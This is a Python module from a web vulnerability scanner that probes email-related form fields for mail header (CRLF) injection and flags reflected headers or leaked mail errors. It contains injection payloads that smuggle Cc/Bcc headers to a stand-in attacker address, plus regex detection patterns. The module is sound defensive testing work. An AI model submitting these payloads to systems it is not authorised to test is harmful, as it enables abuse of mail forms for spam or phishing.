"""
Mail Header Injection Scanner
Detects CRLF injection in email-related form fields (IPA: 1.8 メールヘッダ・インジェクション).

Detection strategy:
  1. Target only fields whose names suggest they feed into email headers
     (email, to, from, cc, bcc, subject, reply_to, …).
  2. Inject CRLF sequences that would add extra headers if unescaped.
  3. Flag when the server:
       a. Reflects the raw CRLF in its HTML response (injection not sanitised), OR
       b. Returns mail-related error messages leaking the injection.
  Note: confirming the injection actually reached an outbound email is out of scope
  for a browser-based scanner; this check is inherently heuristic.
"""
import asyncio
import re
from typing import TYPE_CHECKING

from .base import BaseScanner, Finding

if TYPE_CHECKING:
    from wscan.engine import ScanEngine


# Field-name hints suggesting the value is used in a mail header.
# Long hints are substring-matched; short tokens (to/cc/bcc/from/...) are
# matched as whole words only -- otherwise we'd test unrelated fields
# such as ``token``, ``totp``, ``photo``, ``account``, ``stockton``, etc.
_MAIL_SUBSTRING_HINTS = (
    "email", "e_mail", "mail",
    "subject", "reply_to", "replyto",
    "sender", "recipient",
)
_MAIL_TOKEN_HINTS = frozenset({
    "to", "from", "cc", "bcc",
    "mailto", "mail_to",
    "reply", "replyto",
})


def _field_name_suggests_mail(field_name: str) -> bool:
    name = (field_name or "").lower().replace("-", "_").replace(" ", "_")
    if not name:
        return False
    if any(hint in name for hint in _MAIL_SUBSTRING_HINTS):
        return True
    # Token-style match: split on underscore and dot to handle names like
    # ``contact.to`` or ``mail_cc1``.  Trailing digits are stripped so
    # ``cc1`` / ``bcc_2`` still match without making ``cc`` match ``account``.
    import re as _re
    parts = _re.split(r"[._]", name)
    for part in parts:
        stripped = part.rstrip("0123456789")
        if stripped in _MAIL_TOKEN_HINTS:
            return True
    return False

# Injection payloads — each embeds CRLF variants to split headers
MAIL_INJECTION_PAYLOADS = [
    "test@example.com\r\nCc: attacker@evil.example.com",
    "test@example.com\nCc: attacker@evil.example.com",
    "test@example.com%0aCc: attacker@evil.example.com",
    "test@example.com%0d%0aCc: attacker@evil.example.com",
    "test@example.com\r\nBcc: attacker@evil.example.com",
    # Subject-oriented injection
    "Hello\r\nCc: attacker@evil.example.com",
    "Hello%0d%0aCc: attacker@evil.example.com",
]

# Response patterns that suggest mail-construction error leakage
MAIL_ERROR_PATTERNS = [
    r"mail\(\)\s*failed",
    r"sendmail.*error",
    r"SMTP\s+error",
    r"could not send.*mail",
    r"failed to send.*mail",
    r"invalid.*mail\s+header",
    r"header.*injection",
]

# Compiled pattern to detect raw CRLF + injected Cc/Bcc reflected in the response body
_REFLECTED_INJECTION_RE = re.compile(
    r"(?:\r\n|\n)\s*(?:Cc|Bcc|To|From):\s*attacker", re.IGNORECASE
)


class MailHeaderInjectionScanner(BaseScanner):
    """Mail header injection scanner targeting email-related form fields (IPA 1.8)."""

    CHECK_TYPE = "mail_header"
    SEVERITY = "high"

    async def scan_field(
        self,
        url: str,
        form_index: int,
        field: dict,
        is_url_param: bool = False,
    ) -> list[Finding]:
        field_name = field.get("name", "unknown")

        # Only test fields whose names suggest email header usage
        if not _field_name_suggests_mail(field_name):
            return []

        findings = []

        if self.monitor:
            await self.monitor.emit_status(
                f"Mail header injection testing: {field_name} on {url}"
            )

        for payload in MAIL_INJECTION_PAYLOADS:
            if self.monitor:
                await self.monitor.emit_payload_test(field_name, payload, "mail_header", url)

            source, pair = await self._apply_payload(
                url, form_index, field_name, payload, is_url_param
            )
            await asyncio.sleep(0.2 * self.sleep_factor)

            # Check 1: mail-related error message in response (leaks unsanitised input)
            match = self.check_response_for_patterns(source, MAIL_ERROR_PATTERNS)
            if match:
                finding = await self.record_finding(
                    url=url,
                    field_name=field_name,
                    payload=payload,
                    evidence=(
                        f"Possible mail header injection — mail error in response: '{match}'"
                    ),
                    pair=pair,
                    severity="high",
                )
                findings.append(finding)
                break

            # Check 2: raw CRLF + injected header reflected verbatim in HTML body
            if _REFLECTED_INJECTION_RE.search(source):
                finding = await self.record_finding(
                    url=url,
                    field_name=field_name,
                    payload=payload,
                    evidence=(
                        "Mail header injection: injected CRLF + Cc/Bcc header "
                        "reflected unescaped in the HTTP response body"
                    ),
                    pair=pair,
                    severity="high",
                )
                findings.append(finding)
                break

        return findings

    async def _apply_payload(
        self,
        url: str,
        form_index: int,
        field_name: str,
        payload: str,
        is_url_param: bool,
    ) -> tuple[str, dict]:
        try:
            if is_url_param:
                return await self.browser.test_url_param(url, field_name, payload)
            else:
                await self.browser.navigate(url)
                return await self.browser.fill_and_submit_form(
                    form_index, field_name, payload
                )
        except Exception as exc:
            if self.monitor:
                await self.monitor.emit_status(
                    f"[warn] mail_header: _apply_payload failed on {field_name} @ {url}: {exc}"
                )
            return "", {}
